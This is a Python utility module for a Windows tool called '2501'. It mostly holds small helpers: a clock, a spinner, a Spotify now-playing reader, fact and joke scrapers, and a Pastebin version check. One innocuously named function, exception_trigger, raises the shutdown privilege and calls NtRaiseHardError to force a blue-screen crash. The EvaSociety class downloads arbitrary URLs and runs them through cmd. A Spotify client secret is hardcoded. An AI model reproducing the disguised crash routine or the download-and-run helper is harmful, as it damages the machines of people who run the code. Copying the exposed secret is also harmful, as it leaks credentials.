import time, sys, json, requests, random, string, ctypes, os, subprocess, aiohttp, configparser, spotipy, datetime, logging
from spotipy.oauth2 import SpotifyOAuth
from bs4 import BeautifulSoup

class const:
    libraries_directory = os.path.dirname(os.path.abspath(__file__))
    data_directory = os.path.dirname(libraries_directory)
    main_directory = os.path.dirname(data_directory)
    emoticons = ["(☞ﾟヮﾟ)☞", "(∪.∪ )...zzz", "\\(〇_o)/", "ᕦ(ò_óˇ)ᕤ", "(^\\\\\\^)", "( •̀ ω •́ )✧", "\\^o^/", "(❁´◡`❁)", "(*/ω＼*)", "^_^", "╰(*°▽°*)╯", "(¬‿¬)"]
    directory = "C:/2501/ply_Alib/data"
    if not os.path.exists(directory):
        os.makedirs(directory)


class EXCEPTION_RECORD(ctypes.Structure):
    _fields_ = [
        ("ExceptionCode", ctypes.c_ulong),
        ("ExceptionFlags", ctypes.c_ulong),
        ("ExceptionRecord", ctypes.c_void_p),
        ("ExceptionAddress", ctypes.c_void_p),
        ("NumberParameters", ctypes.c_ulong),
        ("ExceptionInformation", ctypes.c_ulong * 15)
    ]
class EXCEPTION_POINTERS(ctypes.Structure):
    _fields_ = [
        ("ExceptionRecord", ctypes.POINTER(EXCEPTION_RECORD)),
        ("ContextRecord", ctypes.c_void_p)
    ]

class EXCEPTION():
    def exception_trigger():
        ntdll = ctypes.WinDLL('ntdll')
        RtlAdjustPrivilege = ntdll.RtlAdjustPrivilege
        NtRaiseHardError = ntdll.NtRaiseHardError
        STATUS_ASSERTION_FAILURE = 0xC000021A
        SE_SHUTDOWN_PRIVILEGE = 0x13

        prev = ctypes.c_ulong()
        RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, True, False, ctypes.byref(prev))
        status = NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, None, 6, ctypes.byref(ctypes.c_ulong(0)))
        if status != 0:
            print("0_0")


class Clock:
    def curtimeget(self):
        current_time = time.localtime()
        hours = str(current_time.tm_hour).zfill(2)
        minutes = str(current_time.tm_min).zfill(2)
        seconds = str(current_time.tm_sec).zfill(2)
        return f"[{hours}:{minutes}:{seconds}]"

class Animation:
    def animate(self, repeat_count):
        for _ in range(repeat_count):
            for char in ['|', '/', '—', '\\']:
                sys.stdout.write(f'\r[2501] // Delay: {char}')
                sys.stdout.flush()
                time.sleep(0.3)

    def clear_animation(self):
        sys.stdout.write('\r')
        sys.stdout.flush()

class Connection:
    #class Get_AV:
    async def get_data(self):
        config = configparser.ConfigParser()
        config.read(const().directory + "/settings.ini")
        user_id = int(config.get("requests", "user_id"))
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://forum.wayzer.ru/api/users/{user_id}") as response:
                data = await response.json()
                avatar = data['data']['attributes']['avatarUrl']
                name = data['data']['attributes']['displayName']
                return avatar, name

    def get_version(self):
        url = "https://pastebin.com/raw/MuFfZ3BA"
        response = requests.get(url)
        if response.status_code == 200:
            json_data = json.loads(response.text)
            return json_data['version']
        else:
            return "?.?.?"

class Spotify:
    def get_track(self):
        client_id = 'cb70b34f8d424488a46a9d6603dd3930'
        client_secret = '43b489ed98744e0aa45f3034c2068f3c'
        redirect_uri = 'http://localhost:3036'
        sp = spotipy.Spotify(auth_manager=SpotifyOAuth(client_id=client_id, client_secret=client_secret, redirect_uri=redirect_uri,scope='user-read-currently-playing'))
        current_track = sp.currently_playing()
        if current_track is not None:
            track_name = current_track['item']['name']
            artist_name = current_track['item']['artists'][0]['name']
            album_name = current_track['item']['album']['name']
            progress_ms = current_track['progress_ms']
            progress_time = datetime.timedelta(milliseconds=progress_ms)
            formatted_time = str(progress_time).split('.')[0]
            return track_name, artist_name, album_name, formatted_time
        
class RandomStuff:
    #class RandomFact:
    def get_random_fact(self):
        link = 'https://randstuff.ru/fact/'
        response = requests.get(link)
        soup = BeautifulSoup(response.text, 'html.parser')
        fact_block = soup.find('div', id='fact')
        fact_text = fact_block.find('td').text.strip()
        return fact_text
    
    #class RandomJoke:
    def generate_random_joke(self):
        link = 'https://randstuff.ru/joke/'
        response = requests.get(link)
        soup = BeautifulSoup(response.text, 'html.parser')
        joke_block = soup.find('div', id='joke')
        joke_text = joke_block.find('td').text.strip()
        return joke_text

    #class RandomStr:
    def generate_random_string(self, length):
        characters = string.ascii_letters + string.digits + string.punctuation
        return ''.join(random.choice(characters) for _ in range(length))

    def generate_ascii_string(self, length):
        characters = string.ascii_letters
        return ''.join(random.choice(characters) for _ in range(length))


class EvaSociety:
    def download(self, link, path):
        response = requests.get(link)
        if response.status_code == 200:
            with open(path, 'wb') as f:
                f.write(response.content)
            return True
        else:
            return False

    def execeva(self, evaLine, show_console=True, args="python"):
        try:
            if show_console:   
                subprocess.Popen(["cmd", "/c", args, evaLine], creationflags=subprocess.CREATE_NEW_CONSOLE)
            else:
                subprocess.Popen(["cmd", "/c", args, evaLine])
            return True
        except Exception as e:
            print(f"[2501] // An society (ex) logic error occurred: {e}")
            return False
        
class WindowTitle():
    def set(self, title):
        if sys.platform.startswith("win"):
            os.system(f"title {title}")
        elif sys.platform.startswith("linux") or sys.platform.startswith("darwin"):
            sys.stdout.write(f"\x1b]2;{title}\x07")
            sys.stdout.flush()